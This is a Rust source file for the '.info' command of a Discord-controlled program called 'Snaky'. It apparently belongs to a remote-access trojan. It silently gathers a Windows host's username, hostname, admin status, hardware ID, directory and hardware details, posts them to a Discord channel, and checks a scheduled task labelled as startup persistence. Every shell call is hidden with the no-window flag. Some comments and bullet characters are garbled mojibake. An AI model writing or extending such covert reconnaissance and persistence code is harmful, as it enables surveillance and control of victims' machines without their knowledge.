use crate::commands::*;
use crate::system_info::DeviceInfo;
use anyhow::Result;
use async_trait::async_trait;
use std::process::Command;
use std::os::windows::process::CommandExt;
use sysinfo::{CpuExt, DiskExt, System, SystemExt};
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::embed::EmbedFooter;
use twilight_model::channel::message::Message;
use twilight_util::builder::embed::EmbedBuilder;

pub struct InfoCommand;

#[async_trait]
impl BotCommand for InfoCommand {
    fn name(&self) -> &str { "info" }
    fn description(&self) -> &str { "Display information about the bot system" }
    fn category(&self) -> &str { "core" }
    fn usage(&self) -> &str { ".info" }
    fn examples(&self) -> &'static [&'static str] { &[".info"] }
    fn aliases(&self) -> &'static [&'static str] { &["about", "botinfo"] }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, _args: Arguments) -> Result<()> {
        let mut sys = System::new_all();
        sys.refresh_all();

        let device_info = DeviceInfo::new().unwrap_or(DeviceInfo {
            username: "Unknown".to_string(),
            hostname: "Unknown".to_string(),
            os: "Unknown".to_string(),
            os_version: "Unknown".to_string(),
            architecture: "Unknown".to_string(),
            device_id: "Unknown".to_string(),
            hardware_id: "Unknown".to_string(),
            admin_status: false,
            current_directory: "Unknown".to_string(),
        });

        let gpu_info = InfoCommand::get_gpu_info();
        
        // Check startup persistence
        let startup_status = InfoCommand::check_startup_status();

        let system_uptime = sys.uptime();
        let uptime_hours = system_uptime / 3600;
        let uptime_minutes = (system_uptime % 3600) / 60;

        let total_memory_gb = sys.total_memory() as f64 / (1024.0 * 1024.0 * 1024.0);
        let used_memory_gb = sys.used_memory() as f64 / (1024.0 * 1024.0 * 1024.0);
        let available_memory_gb = sys.available_memory() as f64 / (1024.0 * 1024.0 * 1024.0);
        let memory_usage_percent = (used_memory_gb / total_memory_gb) * 100.0;

        let cpu_count = sys.cpus().len();
        let cpu_name = InfoCommand::get_cpu_name();
        let avg_cpu_usage = if !sys.cpus().is_empty() {
            sys.cpus().iter().map(|cpu| cpu.cpu_usage()).sum::<f32>() / cpu_count as f32
        } else {
            0.0
        };

        let mut disk_info = String::new();
        for (i, disk) in sys.disks().iter().enumerate() {
            if i >= 3 { break; }
            let total_gb = disk.total_space() as f64 / (1024.0 * 1024.0 * 1024.0);
            let available_gb = disk.available_space() as f64 / (1024.0 * 1024.0 * 1024.0);
            let used_gb = total_gb - available_gb;
            let usage_percent = (used_gb / total_gb) * 100.0;

            disk_info.push_str(&format!(
                "**{}:** {:.1}GB/{:.1}GB ({:.1}%)\n",
                disk.mount_point().display(),
                used_gb,
                total_gb,
                usage_percent
            ));
        }
        if disk_info.is_empty() {
            disk_info = "No disk information available".to_string();
        }

        let process_count = sys.processes().len();

        let embed = EmbedBuilder::new()
            .description(format!(
                "**System Information**\n\n\
                **System**\n\
                ??Host: {}\n\
                ??OS: {}\n\
                ??User: {} ({})\n\
                ??Directory: {}\n\n\
                **CPU**\n\
                ??Model: {}\n\
                ??Cores: {}\n\
                ??Usage: {:.1}%\n\
                ??Uptime: {}h {}m\n\n\
                **Memory**\n\
                ??Total: {:.2} GB\n\
                ??Used: {:.2} GB ({:.1}%)\n\
                ??Available: {:.2} GB\n\n\
                **Graphics**\n\
                {}\n\n\
                **Storage**\n\
                {}\n\n\
                **Status**\n\
                ??Processes: {}\n\
                ??Admin: {}\n\
                ??Startup: {}",
                device_info.hostname,
                device_info.os_version,
                device_info.username,
                if device_info.admin_status {
                    "Administrator"
                } else {
                    "Standard User"
                },
                device_info
                    .current_directory
                    .chars()
                    .take(50)
                    .collect::<String>()
                    + if device_info.current_directory.len() > 50 {
                        "..."
                    } else {
                        ""
                    },
                cpu_name.chars().take(50).collect::<String>()
                    + if cpu_name.len() > 50 { "..." } else { "" },
                cpu_count,
                avg_cpu_usage,
                uptime_hours,
                uptime_minutes,
                total_memory_gb,
                used_memory_gb,
                memory_usage_percent,
                available_memory_gb,
                gpu_info,
                disk_info,
                process_count,
                if device_info.admin_status {
                    "Yes"
                } else {
                    "No"
                },
                startup_status
            ))
            .footer(EmbedFooter {
                text: format!(
                    "Snaky v0.2.5 ??HWID: {}",
                    device_info.hardware_id.chars().take(8).collect::<String>()
                ),
                icon_url: None,
                proxy_icon_url: None,
            })
            .build();

        // http_client::HttpClient?먮뒗 create_message_embeds媛 ?놁쑝誘濡? create_message瑜??ъ슜?섎룄濡??섏젙
        http.create_message_with_embeds(msg.channel_id.get(), &[embed]).await?;

        Ok(())
    }
}

impl InfoCommand {
    fn check_startup_status() -> String {
        use crate::config::Config;
        use std::os::windows::process::CommandExt;
        
        let startup_config = Config::get_startup_config();
        
        if !startup_config.enabled {
            return "Disabled".to_string();
        }
        
        let task_name = startup_config.task_name;
        
        // try w /fo LIST format for better parsing
        match Command::new("schtasks")
            .args(["/query", "/tn", &task_name, "/fo", "LIST"])
            .creation_flags(0x08000000)
            .output()
        {
            Ok(output) => {
                if output.status.success() {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    if stdout.contains(&task_name) {
                        "Active".to_string()
                    } else {
                        "Not Found".to_string()
                    }
                } else {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    if stderr.contains("ERROR: The system cannot find") {
                        "Not Found".to_string()
                    } else {
                        format!("Error: {}", stderr.lines().next().unwrap_or("Unknown"))
                    }
                }
            }
            Err(e) => format!("Check Failed: {}", e)
        }
    }

    fn get_cpu_name() -> String {
        if cfg!(target_os = "windows") {
            if let Ok(output) = Command::new("wmic")
                .args(["cpu", "get", "name", "/format:list"])
                .creation_flags(0x08000000)
                .output()
            {
                if output.status.success() {
                    let result = String::from_utf8_lossy(&output.stdout);
                    for line in result.lines() {
                        if line.starts_with("Name=") && !line.ends_with("=") {
                            let cpu_name =
                                line.strip_prefix("Name=").unwrap_or("").trim().to_string();
                            if !cpu_name.is_empty() {
                                return cpu_name;
                            }
                        }
                    }
                }
            }

            if let Ok(output) = Command::new("powershell")
                .args([
                    "-Command",
                    "Get-WmiObject -Class Win32_Processor | Select-Object Name | Format-List",
                ])
                .creation_flags(0x08000000)
                .output()
            {
                if output.status.success() {
                    let result = String::from_utf8_lossy(&output.stdout);
                    for line in result.lines() {
                        if line.trim().starts_with("Name") && line.contains(':') {
                            if let Some(name) = line.split(':').nth(1) {
                                let cpu_name = name.trim().to_string();
                                if !cpu_name.is_empty() {
                                    return cpu_name;
                                }
                            }
                        }
                    }
                }
            }

            if let Ok(output) = Command::new("reg")
                .args([
                    "query",
                    "HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
                    "/v",
                    "ProcessorNameString",
                ])
                .creation_flags(0x08000000)
                .output()
            {
                if output.status.success() {
                    let result = String::from_utf8_lossy(&output.stdout);
                    for line in result.lines() {
                        if line.contains("ProcessorNameString") && line.contains("REG_SZ") {
                            if let Some(parts) = line.split("REG_SZ").nth(1) {
                                let cpu_name = parts.trim().to_string();
                                if !cpu_name.is_empty() {
                                    return cpu_name;
                                }
                            }
                        }
                    }
                }
            }
        }

        "Unknown CPU".to_string()
    }

    fn get_gpu_info() -> String {
        if cfg!(target_os = "windows") {
            let mut gpus = Vec::new();

            if let Ok(output) = Command::new("wmic")
                .args([
                    "path",
                    "win32_VideoController",
                    "get",
                    "Name,AdapterRAM",
                    "/format:list",
                ])
                .creation_flags(0x08000000)
                .output()
            {
                if output.status.success() {
                    let result = String::from_utf8_lossy(&output.stdout);
                    let mut current_gpu_name = String::new();
                    let mut current_gpu_memory = String::new();

                    for line in result.lines() {
                        if line.starts_with("Name=") && !line.ends_with("=") {
                            current_gpu_name =
                                line.strip_prefix("Name=").unwrap_or("").trim().to_string();
                        } else if line.starts_with("AdapterRAM=") && !line.ends_with("=") {
                            if let Ok(memory_bytes) = line
                                .strip_prefix("AdapterRAM=")
                                .unwrap_or("0")
                                .parse::<u64>()
                            {
                                if memory_bytes > 0 {
                                    current_gpu_memory = format!(
                                        "{:.1}GB",
                                        memory_bytes as f64 / (1024.0 * 1024.0 * 1024.0)
                                    );
                                }
                            }

                            if !current_gpu_name.is_empty()
                                && !current_gpu_name.to_lowercase().contains("microsoft")
                                && !current_gpu_name.to_lowercase().contains("remote")
                            {
                                let memory_info = if !current_gpu_memory.is_empty() {
                                    format!(" ({})", current_gpu_memory)
                                } else {
                                    String::new()
                                };

                                gpus.push(format!(
                                    "{}{}",
                                    current_gpu_name.chars().take(35).collect::<String>()
                                        + if current_gpu_name.len() > 35 {
                                            "..."
                                        } else {
                                            ""
                                        },
                                    memory_info
                                ));
                            }

                            current_gpu_name.clear();
                            current_gpu_memory.clear();
                        }
                    }
                }
            }

            if !gpus.is_empty() {
                return format!(
                    "**GPU{}:** {}",
                    if gpus.len() > 1 { "s" } else { "" },
                    gpus.join("\n")
                );
            }

            if let Ok(output) = Command::new("powershell")
                .args(["-Command", "Get-WmiObject -Class Win32_VideoController | Select-Object Name, AdapterRAM | Format-List"])
                .creation_flags(0x08000000)
                .output()
            {
                if output.status.success() {
                    let result = String::from_utf8_lossy(&output.stdout);
                    let mut gpu_names = Vec::new();

                    for line in result.lines() {
                        if line.trim().starts_with("Name") && line.contains(':') {
                            if let Some(name) = line.split(':').nth(1) {
                                let gpu_name = name.trim().to_string();
                                if !gpu_name.is_empty() &&
                                   !gpu_name.to_lowercase().contains("microsoft") &&
                                   !gpu_name.to_lowercase().contains("remote") {
                                    gpu_names.push(gpu_name.chars().take(35).collect::<String>() +
                                        if gpu_name.len() > 35 { "..." } else { "" });
                                }
                            }
                        }
                    }

                    if !gpu_names.is_empty() {
                        return format!("**GPU{}:** {}",
                            if gpu_names.len() > 1 { "s" } else { "" },
                            gpu_names.join("\n")
                        );
                    }
                }
            }
        }

        "**GPU:** Not detected".to_string()
    }
}
